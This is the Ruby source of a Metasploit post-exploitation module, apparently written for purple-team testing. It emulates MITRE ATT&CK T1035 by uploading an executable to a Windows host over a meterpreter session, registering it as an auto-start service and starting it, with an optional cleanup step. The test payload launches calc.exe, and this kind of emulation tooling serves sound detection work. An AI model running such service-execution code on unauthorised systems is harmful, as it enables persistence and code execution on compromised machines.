##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Exploit::FileDropper
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Services

  def initialize(info={})
    super(update_info(info,
        'Name'          => 'Service Execution (T1035) Windows - Purple Team',
        'Description'   => %q{
            Execution:
            Adversaries may execute a binary, command, or script via a method that interacts with Windows services,
            such as the Service Control Manager. This can be done by either creating a new service or modifying an
            existing service. This technique is the execution used in conjunction with New Service and Modify Existing
            Service during service persistence or privilege escalation.

            This module upload a service to C:\Windows\Temp that starts calc.exe from c:\windows\system32\calc.exe.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Praetorian' ],
        'Platform'      => [ 'win' ],
        'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1035' ] ],
        'SessionTypes'  => [ 'meterpreter' ]
    ))

        register_options(
        [
          OptString.new("FILE_TO_UPLOAD", [true, 'Service executable to be loaded on target host', ::File.join(Msf::Config.data_directory, 'purple', 't1035', 't1035svc.exe')]),
          OptString.new("UPLOAD_PATH", [true, 'File upload path', 'C:\\t1035svc.exe']),
          OptString.new("SERVICE_NAME", [true, 'Name of service to be created', 't1035svc']),
          OptString.new("SERVICE_EXE", [true, 'Name of service to be created', 'C:\\t1035svc.exe']),
          OptBool.new("CLEANUP", [true, 'Cleanup EXE and remove service', true])
        ])
  end

  def run
    begin
      raise "Module requires meterpreter session." if session.type != "meterpreter"
      fail_with(Failure::NoAccess, "Module requires administrator rights.") if not is_admin?

      # upload executable
      print_status("Uploading file")
      upload_file("#{datastore['UPLOAD_PATH']}", "#{datastore['FILE_TO_UPLOAD']}")

      # create service
      print_status("Creating service")
      results = service_create("#{datastore['SERVICE_NAME']}",
                             display: "#{datastore['SERVICE_NAME']}",
                             path: "#{datastore['SERVICE_EXE']}",
                             starttype: START_TYPE_AUTO)
      results = service_status("#{datastore['SERVICE_NAME']}")
      if results[:state] == 1
        print_good("Service successfully created")
      else
        raise "Failed creating service (error #{results[:state]})."
      end

      # start the service
      service_start("#{datastore['SERVICE_NAME']}")
      results = service_status("#{datastore['SERVICE_NAME']}")
      if results[:state] == 4
        print_good("Service successfully started")
      else
        raise "Failed starting service (error #{results[:state]})."
      end

      # do cleanup
      if datastore['CLEANUP']
        service_stop("#{datastore['SERVICE_NAME']}")
        print_status('Removing service executable.')
        register_file_for_cleanup("#{datastore['UPLOAD_PATH']}")
        print_status("Removing service.")
        service_delete("#{datastore['SERVICE_NAME']}")
      end

      print_good("Module T1035 execution successful.")

    rescue ::Exception => e
      print_error("#{e.message}")
      print_error("Module T1035 execution failed.")
    end
  end
end
